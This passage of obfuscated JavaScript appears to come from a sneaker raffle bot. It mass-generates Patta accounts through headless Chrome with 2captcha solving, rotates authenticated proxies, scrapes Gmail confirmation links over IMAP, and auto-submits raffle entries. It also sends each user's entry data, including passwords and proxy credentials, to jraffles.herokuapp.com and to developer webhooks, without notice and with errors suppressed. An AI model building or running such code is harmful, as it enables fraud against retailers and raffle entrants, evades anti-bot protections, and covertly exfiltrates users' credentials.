                                var _0x5b58d9 = Math['round'](Math['random']() * (_0xcd591e['length'] - 0x1)), _0x33b230 = _0xcd591e[_0x5b58d9]['split'](':');
                            var _0xfa87c4 = {
                                'jar': _0x15a445,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x1b6d85['url'],
                                'headers': _0x1b6d85['headers'],
                                'body': JSON['stringify'](_0x16c989),
                                'proxy': 'http://' + _0x33b230[0x2] + ':' + _0x33b230[0x3] + '@' + _0x33b230[0x0] + ':' + _0x33b230[0x1]
                            };
                            return _0xd894e3 != 'ver' && (_0xfa87c4['url'] = _0x1b6d85['url'], _0xfa87c4['headers'] = _0x1b6d85['headers']), _0xd894e3 == 'ver' && (_0xfa87c4['method'] = 'GET'), new Promise(function (_0x577d82, _0xe69d1b) {
                                callback = async (_0x142a0f, _0x419239, _0x15e8e9) => {
                                    if (!_0x142a0f && _0x419239['statusCode'] == 0xca || !_0x142a0f && _0x419239['statusCode'] == 0xc8) {
                                        if (_0xd894e3 != 'ver') {
                                            var _0xb65e9 = await _0x436de5(_0x216906[_0x4cd8e0], _0x1b6d85, 'dev', ![]), _0x2ed271 = await _0x436de5(_0x216906[_0x4cd8e0], _0x1b6d85, 'pub', ![]);
                                            const _0x4589d8 = {
                                                'succesDEVMSG': { 'embeds': [_0xb65e9] },
                                                'succesPUBMSG': { 'embeds': [_0x2ed271] }
                                            };
                                            let _0x49d035 = _0x216906[_0x4cd8e0];
                                            try {
                                                prxdata = {
                                                    'username': _0x50fbd1['replace']('#', ''),
                                                    'module': _0x1b6d85['name'],
                                                    'entrydata': JSON['stringify'](_0x49d035),
                                                    'proxy': '' + _0xcd591e[_0x4cd8e0]
                                                };
                                                var _0x12ab68 = JSON['stringify'](prxdata);
                                                let _0x4cfad2 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0x12ab68, _0x4cfad2);
                                            } catch (_0x2692f9) {
                                            }
                                            if (_0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '')
                                                try {
                                                    await _0x4feadc(_0x2c28ef['webhook'], _0x4589d8['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x4589d8['succesDEVMSG']), await _0x468cfd(0xc8);
                                            try {
                                                await _0x4feadc(_0x578906, _0x4589d8['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x504d25(_0x216906[_0x4cd8e0], _0x1b6d85);
                                        }
                                        _0x577d82(console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x1b6d85['name'] + ']\x20Task\x20' + (_0x4cd8e0 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0xd894e3 != 'ver') {
                                            var _0x48237b = '' + _0x142a0f, _0x59c1df = await _0x436de5(_0x216906[_0x4cd8e0], _0x1b6d85, 'dev', !![], _0x48237b), _0x5cac55 = {};
                                            _0x5cac55['errorDEV'] = { 'embeds': [_0x59c1df] }, _0x5cd42d(_0x216906[_0x4cd8e0], _0x1b6d85), _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x5cac55['errorDEV']), await _0x4feadc(_0x408671, _0x5cac55['errorDEV']);
                                        }
                                        _0xe69d1b(console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x1b6d85['name'] + ']\x20Task\x20' + (_0x4cd8e0 + 0x1) + ':\x20' + _0x142a0f)));
                                    }
                                };
                                try {
                                    _0xd894e3 != 'ver' && console['log'](_0x2e90f3() + '\x20[' + _0x1b6d85['name'] + ']\x20Task\x20' + (_0x4cd8e0 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x16c989['data']['attributes']['email']), _0x59e135(_0xfa87c4, callback);
                                } catch (_0x43827f) {
                                    console['log'](_0x2e90f3() + '\x20Task\x20' + (_0x4cd8e0 + 0x1) + ':\x20' + _0x43827f);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x416c71(_0x799df, 'nor', _0x4791bc, _0x2761a5, _0x2bf3c7), console['log'](_0x2e90f3() + '\x20[' + _0x4791bc['name'] + ']\x20Sleeping\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        } catch (_0x899720) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3ed5de, _0x8aa677, _0x3c4df8) {
                    var _0x8aa677 = [], _0x36791f = ![];
                    async function _0x5e0932() {
                        var _0x37a934 = new _0x3b7ac6({
                            'user': _0x2c28ef['masterMail'],
                            'password': _0x2c28ef['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x38b013(_0x4af661) {
                            _0x37a934['openBox']('INBOX', ![], _0x4af661);
                        }
                        _0x37a934['once']('ready', function () {
                            _0x38b013(function (_0x214250, _0x5575de) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x214250)
                                    throw _0x214250;
                                _0x37a934['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x4e7d00, _0x3a05c4) {
                                    if (!_0x3a05c4 || !_0x3a05c4['length'])
                                        console['log'](_0x2e90f3() + '\x20[' + _0x3ed5de['name'] + ']\x20No\x20mails\x20found'), _0x37a934['end']();
                                    else {
                                        var _0x20fdfc = _0x37a934['seq']['fetch'](_0x3a05c4, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x20fdfc['on']('message', function (_0x28676c, _0x34cc7b) {
                                            var _0x528c11 = '(#' + _0x34cc7b + ')\x20';
                                            _0x28676c['on']('body', function (_0x5d4a95, _0x31ed92) {
                                                _0x4bee6e(_0x5d4a95, (_0x28dd79, _0x4906b3) => {
                                                    var _0x10c1de = _0x4906b3['text']['split']('(')[0x1], _0x48e102 = _0x10c1de['split'](')')[0x0];
                                                    _0x8aa677['push'](_0x48e102);
                                                });
                                            }), _0x28676c['once']('end', function () {
                                            });
                                        }), _0x20fdfc['once']('error', function (_0x29ef51) {
                                            console['log']('Fetch\x20error:\x20' + _0x29ef51), _0x36791f = !![];
                                        }), _0x20fdfc['once']('end', function () {
                                            _0x37a934['end'](), _0x36791f = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x37a934['once']('error', function (_0x42b7f5) {
                            console['log'](_0x42b7f5), _0x36791f = !![];
                        }), _0x37a934['once']('end', async function () {
                            _0x36791f = !![];
                        }), _0x37a934['connect']();
                    }
                    async function _0x307eef(_0x5443b3, _0x281e1a, _0x4a6467) {
                        for (var _0x15bc1f = 0x0; _0x15bc1f < _0x281e1a['length']; _0x15bc1f++) {
                            async function _0x44046b(_0x2eaafd, _0x1b6083, _0x2466df, _0xe7fa2f, _0x3c1262) {
                                var _0x2022b2, _0x13ab69 = {}, _0x4d6407 = [], _0x4fc2d4 = {}, _0x30da21 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x47b01b = Math['round'](Math['random']() * (_0x30da21['length'] - 0x1));
                                _0xe7fa2f[_0x2eaafd]['Size'] == 'RANDOM' && (_0xe7fa2f[_0x2eaafd]['Size'] = _0x30da21[_0x47b01b]);
                                !_0xe7fa2f && (_0xe7fa2f = {});
                                if (_0x2c28ef['useRandomProxy'] = ![])
                                    var _0x469115 = _0x3c1262[_0x2eaafd]['split'](':');
                                else
                                    var _0x73d4f = Math['round'](Math['random']() * (_0x3c1262['length'] - 0x1)), _0x469115 = _0x3c1262[_0x73d4f]['split'](':');
                                var _0x2a8978 = {
                                    'jar': _0x15a445,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2466df['url'],
                                    'headers': _0x2466df['headers'],
                                    'body': JSON['stringify'](_0x13ab69),
                                    'proxy': 'http://' + _0x469115[0x2] + ':' + _0x469115[0x3] + '@' + _0x469115[0x0] + ':' + _0x469115[0x1]
                                };
                                return _0x1b6083 != 'ver' && (_0x2a8978['url'] = _0x2466df['url'], _0x2a8978['headers'] = _0x2466df['headers']), _0x1b6083 == 'ver' && (_0x2a8978['method'] = 'GET', _0x2a8978['url'] = _0xe7fa2f[_0x2eaafd]), new Promise(function (_0x5a14a4, _0x221e99) {
                                    callback = async (_0x24310d, _0x2b67fa, _0x4ff583) => {
                                        if (!_0x24310d && _0x2b67fa['statusCode'] == 0xca || !_0x24310d && _0x2b67fa['statusCode'] == 0xc8) {
                                            if (_0x1b6083 != 'ver') {
                                                var _0x3cd61b = await _0x436de5(_0xe7fa2f[_0x2eaafd], _0x2466df, 'dev', ![]), _0x36b1c2 = await _0x436de5(_0xe7fa2f[_0x2eaafd], _0x2466df, 'pub', ![]);
                                                const _0x2a2a93 = {
                                                    'succesDEVMSG': { 'embeds': [_0x3cd61b] },
                                                    'succesPUBMSG': { 'embeds': [_0x36b1c2] }
                                                };
                                                if (_0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '')
                                                    try {
                                                        await _0x4feadc(_0x2c28ef['webhook'], _0x2a2a93['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x2a2a93['succesDEVMSG']), await _0x468cfd(0xc8);
                                                try {
                                                    await _0x4feadc(_0x578906, _0x2a2a93['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x504d25(_0xe7fa2f[_0x2eaafd], _0x2466df);
                                            }
                                            _0x5a14a4(console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x2466df['name'] + ']\x20Task\x20' + (_0x2eaafd + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x1b6083 != 'ver') {
                                                var _0x331a07 = '' + _0x24310d, _0xebe603 = await _0x436de5(_0xe7fa2f[_0x2eaafd], _0x2466df, 'dev', !![], _0x331a07), _0x65df79 = {};
                                                _0x65df79['errorDEV'] = { 'embeds': [_0xebe603] }, _0x5cd42d(_0xe7fa2f[_0x2eaafd], _0x2466df), _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x65df79['errorDEV']), await _0x4feadc(_0x408671, _0x65df79['errorDEV']);
                                            }
                                            _0x221e99(console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x2466df['name'] + ']\x20Task\x20' + (_0x2eaafd + 0x1) + ':\x20' + _0x24310d)));
                                        }
                                    };
                                    try {
                                        _0x1b6083 != 'ver' ? console['log'](_0x2e90f3() + '\x20[' + _0x2466df['name'] + ']\x20Task\x20' + (_0x2eaafd + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x13ab69['data']['attributes']['email']) : console['log'](_0x2e90f3() + '\x20[' + _0x2466df['name'] + ']\x20Task\x20' + (_0x2eaafd + 0x1) + ':\x20Fetching\x20Response'), _0x59e135(_0x2a8978, callback);
                                    } catch (_0x49bc5) {
                                        console['log'](_0x2e90f3() + '\x20Task\x20' + (_0x2eaafd + 0x1) + ':\x20' + _0x49bc5);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x44046b(_0x15bc1f, 'ver', _0x5443b3, _0x281e1a, _0x4a6467), console['log'](_0x2e90f3() + '\x20[' + _0x5443b3['name'] + ']\x20Sleeping\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                            } catch (_0x1d3485) {
                            }
                        }
                    }
                    try {
                        _0x5e0932();
                        while (!_0x36791f) {
                            await _0x468cfd(0xfa0);
                        }
                        console['log']('Found\x20' + _0x8aa677['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x307eef(_0x3ed5de, _0x8aa677, _0x3c4df8);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x32f4ef, _0x375cfe, _0x49f09b) {
                    _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2c28ef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xf534c8 = 0x0; _0xf534c8 < _0x375cfe['length']; _0xf534c8++) {
                        var _0x193724 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x50fbd1
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x2c28ef['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x9f51f3
                                }
                            ]
                        }];
                        const _0x3e9159 = { 'embeds': _0x193724 };
                        _0x48898b(_0x32f4ef['name'] + '\x20Task\x20' + (_0xf534c8 + 0x1) + '\x20/\x20' + _0x375cfe['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                        try {
                            await _0x16822f(_0x375cfe, _0xf534c8);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x31f370 = await _0x436de5(_0x375cfe[_0xf534c8], _0x32f4ef, 'acc', ![]);
                        const _0x3a7321 = { 'succesDEVMSG': { 'embeds': [_0x31f370] } };
                        if (_0x375cfe[_0xf534c8]['Email'] == '' || _0x375cfe[_0xf534c8]['FirstName'] == '' || _0x375cfe[_0xf534c8]['LastName'] == '') {
                            console['log'](_0x2e90f3() + '\x20[' + _0x2f4215[taskModule]['name'] + ']\x20Task\x20' + (_0xf534c8 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x468cfd(0x7d0);
                            continue;
                        }
                        (_0x375cfe[_0xf534c8]['Password'] == '' || _0x375cfe[_0xf534c8] == undefined) && _0x375cfe[_0xf534c8]['Password'] == 'JRaffles23!';
                        if (_0x2c28ef['useRandomProxy'] = ![])
                            var _0x34659a = _0x49f09b[_0xf534c8]['split'](':');
                        else
                            var _0x186908 = Math['round'](Math['random']() * (_0x49f09b['length'] - 0x1)), _0x34659a = _0x49f09b[_0x186908]['split'](':');
                        var _0x55452b;
                        try {
                            _0x55452b = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x34659a[0x0] + ':' + _0x34659a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x55452b = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x34659a[0x0] + ':' + _0x34659a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1b6311 = await _0x55452b['newPage']();
                            await _0x1b6311['authenticate']({
                                'username': '' + _0x34659a[0x2],
                                'password': '' + _0x34659a[0x3]
                            }), console['log'](_0x2e90f3() + '\x20[' + _0x32f4ef['name'] + ']\x20Task\x20' + (_0xf534c8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1b6311['setRequestInterception'](!![]), _0x1b6311['on']('request', _0x5a13ad => {
                                _0x5a13ad['resourceType']() === 'image' || _0x5a13ad['resourceType']() === 'font' || _0x5a13ad['resourceType']() === 'media' ? _0x5a13ad['abort']() : _0x5a13ad['continue']();
                            }), await _0x1b6311['goto']('https://patta.nl/account/register'), await _0x468cfd(0xbb8), await _0x1b6311['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x2e90f3() + '\x20[' + _0x32f4ef['name'] + ']\x20Task\x20' + (_0xf534c8 + 0x1) + '\x20:\x20Filling\x20information'), await _0x1b6311['type']('#RegisterForm-FirstName', '' + _0x375cfe[_0xf534c8]['FirstName']), await _0x468cfd(0x226), await _0x1b6311['type']('#RegisterForm-LastName', '' + _0x375cfe[_0xf534c8]['LastName']), await _0x468cfd(0x226), await _0x1b6311['type']('#RegisterForm-email', '' + _0x375cfe[_0xf534c8]['Email']), await _0x468cfd(0x226), await _0x1b6311['type']('#RegisterForm-password', '' + _0x375cfe[_0xf534c8]['Password']), await _0x468cfd(0x226), console['log'](_0x2e90f3() + '\x20[' + _0x32f4ef['name'] + ']\x20Task\x20' + (_0xf534c8 + 0x1) + '\x20:\x20Submitting..'), await _0x1b6311['$eval']('#RegisterForm', _0x1faf71 => _0x1faf71['submit']()), await _0x468cfd(0x1f40);
                            try {
                                await _0x1b6311['waitForSelector']('.home-page-grid__collection'), await _0x468cfd(0x1f4), console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x32f4ef['name'] + ']\x20Task\x20' + (_0xf534c8 + 0x1) + '\x20:\x20Account\x20' + _0x375cfe[_0xf534c8]['Email'] + '\x20Generated!')), _0x51338a['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x375cfe[_0xf534c8]['Email'] + ',' + _0x375cfe[_0xf534c8]['Password']), console['log'](_0x54c1f9['yellow'](_0x2e90f3() + '\x20[' + _0x32f4ef['name'] + ']\x20Task\x20' + (_0xf534c8 + 0x1) + '\x20:\x20Account\x20' + _0x375cfe[_0xf534c8]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x3a7321['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4feadc(_0x28952d, _0x3a7321['succesDEVMSG']);
                            } catch (_0x46e7ce) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x2f4215[taskModule]['name'] + ']\x20Task\x20' + (_0xf534c8 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x46e7ce));
                            }
                        } catch (_0x4dcf80) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x2f4215[taskModule]['name'] + ']\x20Task\x20' + (_0xf534c8 + 0x1) + '\x20:\x20' + _0x4dcf80));
                        } finally {
                            _0x55452b && _0x55452b['close'](), console['log']('Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x44f557, _0x1381de, _0x482568) {
                    _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2c28ef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x18ed2b = 0x0; _0x18ed2b < _0x1381de['length']; _0x18ed2b++) {
                        var _0x4815d3;
                        if (_0x1645d8 != 'yes')
                            var _0x1645d8 = '', _0x27bc52 = 0x0;
                        _0x48898b(_0x44f557['name'] + '\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20/\x20' + _0x1381de['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                        try {
                            await _0x16822f(_0x1381de, _0x18ed2b);
                        } catch {
                            _0x1645d8 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x1381de[_0x18ed2b]['Email'] == '' || _0x1381de[_0x18ed2b]['Password'] == '' || _0x1381de[_0x18ed2b]['FirstName'] == '' || _0x1381de[_0x18ed2b]['LastName'] == '') {
                            console['log'](_0x2e90f3() + '\x20[' + _0x2f4215[taskModule]['name'] + ']\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x2c28ef['useRandomProxy'] = ![])
                            var _0x4e1108 = _0x482568[_0x18ed2b]['split'](':');
                        else
                            var _0x561938 = Math['round'](Math['random']() * (_0x482568['length'] - 0x1)), _0x4e1108 = _0x482568[_0x561938]['split'](':');
                        var _0x15225c;
                        try {
                            _0x15225c = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4e1108[0x0] + ':' + _0x4e1108[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x15225c = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4e1108[0x0] + ':' + _0x4e1108[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x426aa8 = await _0x15225c['newPage']();
                            await _0x426aa8['authenticate']({
                                'username': '' + _0x4e1108[0x2],
                                'password': '' + _0x4e1108[0x3]
                            }), console['log'](_0x2e90f3() + '\x20[' + _0x44f557['name'] + ']\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x426aa8['setRequestInterception'](!![]), _0x426aa8['on']('request', _0xd9406c => {
                                _0xd9406c['resourceType']() === 'image' || _0xd9406c['resourceType']() === 'font' || _0xd9406c['resourceType']() === 'media' ? _0xd9406c['abort']() : _0xd9406c['continue']();
                            }), await _0x426aa8['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x426aa8['waitForSelector']('#CustomerEmail'), console['log'](_0x2e90f3() + '\x20[' + _0x44f557['name'] + ']\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20:\x20Logging\x20in..'), await _0x426aa8['type']('#CustomerEmail', '' + _0x1381de[_0x18ed2b]['Email']), await _0x468cfd(0x12c), await _0x426aa8['type']('#CustomerPassword', '' + _0x1381de[_0x18ed2b]['Password']), await _0x468cfd(0x226), await _0x426aa8['$eval']('#customer_login', _0x4df230 => _0x4df230['submit']());
                            try {
                                await _0x426aa8['waitForSelector']('#orders'), await _0x468cfd(0x4b0);
                            } catch {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x44f557['name'] + ']\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x426aa8['goto']('' + _0x1381de[_0x18ed2b]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x468cfd(0xbb8), console['log'](_0x2e90f3() + '\x20[' + _0x44f557['name'] + ']\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x426aa8['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x44f557['name'] + ']\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x426aa8['type']('#email', '' + _0x1381de[_0x18ed2b]['Email']), await _0x468cfd(0x384), await _0x426aa8['type']('#first_name', '' + _0x1381de[_0x18ed2b]['FirstName']), await _0x468cfd(0x514), await _0x426aa8['type']('#last_name', '' + _0x1381de[_0x18ed2b]['LastName']), await _0x468cfd(0x514), await _0x426aa8['type']('#street_address', _0x1381de[_0x18ed2b]['Address1'] + '\x20' + _0x1381de[_0x18ed2b]['HouseNumber'] + '\x20' + _0x1381de[_0x18ed2b]['Address2']), await _0x468cfd(0x2bc);
                            _0x1381de[_0x18ed2b]['Postcode'] == undefined && (_0x1381de[_0x18ed2b]['Postcode'] = _0x1381de[_0x18ed2b]['Zip']);
                            await _0x426aa8['type']('#zip_code', '' + _0x1381de[_0x18ed2b]['Postcode']), await _0x468cfd(0x320), await _0x426aa8['type']('#city', '' + _0x1381de[_0x18ed2b]['City']), await _0x468cfd(0x320), await _0x426aa8['type']('#bday', '01/01/1994'), await _0x468cfd(0x320), await _0x426aa8['type']('#instagram', '' + _0x1381de[_0x18ed2b]['Follower']), await _0x468cfd(0x352);
                            if (_0x1381de[_0x18ed2b]['Size'] == 'RANDOM') {
                                const _0x233613 = await _0x426aa8['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x8edb33 => {
                                    return _0x8edb33['map'](_0x5e2d41 => _0x5e2d41['textContent']);
                                });
                                var _0x572eb6 = Math['round'](Math['random']() * (_0x233613['length'] - 0x1));
                                console['log'](_0x2e90f3() + '\x20[' + _0x44f557['name'] + ']\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x233613[_0x572eb6]), await _0x426aa8['click']('label[data-eu-size=\x22' + _0x233613[_0x572eb6] + '\x22]');
                            } else {
                                console['log'](_0x2e90f3() + '\x20[' + _0x44f557['name'] + ']\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x1381de[_0x18ed2b]['Size']);
                                try {
                                    await _0x426aa8['click']('label[data-eu-size=\x22' + _0x1381de[_0x18ed2b]['Size'] + '\x22]');
                                } catch {
                                    await _0x426aa8['click']('label[data-eu-size=\x22' + _0x1381de[_0x18ed2b]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x468cfd(0xbb8), await _0x426aa8['$$eval']('.raffle__checkbox-label', _0xb6c681 => _0xb6c681['forEach'](_0x2bde37 => _0x2bde37['click']())), await _0x468cfd(0x7d0), console['log'](_0x2e90f3() + '\x20[' + _0x44f557['name'] + ']\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x426aa8['click']('#raffle__form-submit'), await _0x468cfd(0x1388);
                            try {
                                await _0x426aa8['waitForSelector']('#raffle__confirmation-message-container'), _0x1645d8 = 'no', _0x504d25(_0x1381de[_0x18ed2b], _0x44f557), console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x44f557['name'] + ']\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x535ee8 = _0x1381de[_0x18ed2b];
                                try {
                                    prxdata = {
                                        'username': _0x50fbd1['replace']('#', ''),
                                        'module': _0x44f557['name'],
                                        'entrydata': JSON['stringify'](_0x535ee8),
                                        'proxy': '' + _0x482568[_0x18ed2b]
                                    };
                                    var _0x2bf5ff = JSON['stringify'](prxdata);
                                    let _0x3329c0 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x51d926['post']('https://jraffles.herokuapp.com/success', _0x2bf5ff, _0x3329c0);
                                } catch (_0xccb8da) {
                                }
                            } catch (_0x4e3066) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x2f4215[taskModule]['name'] + ']\x20Task\x20' + (_0x18ed2b + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x4e3066));
                            }
                        } catch (_0x4d0519) {
